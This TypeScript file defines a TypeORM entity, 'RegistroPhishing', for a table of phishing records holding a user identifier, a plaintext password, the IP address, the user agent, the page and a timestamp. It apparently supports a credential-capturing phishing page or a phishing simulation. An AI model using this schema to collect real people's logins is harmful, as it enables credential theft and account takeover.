import {
  Entity,
  Column,
  PrimaryGeneratedColumn,
  CreateDateColumn,
} from 'typeorm';

@Entity('registros_phishing')
export class RegistroPhishing {
  @PrimaryGeneratedColumn()
  id: number;

  @Column()
  ch: string;

  @Column()
  password: string;

  @Column({ name: 'ip_address' })
  ipAddress: string;

  @Column({ name: 'user_agent', nullable: true, type: 'text' })
  userAgent: string;

  @Column({ nullable: true })
  pagina: string;

  @CreateDateColumn({ name: 'fecha_hora' })
  fechaHora: Date;

  @Column({ default: 'intento' })
  tipo: string;
}
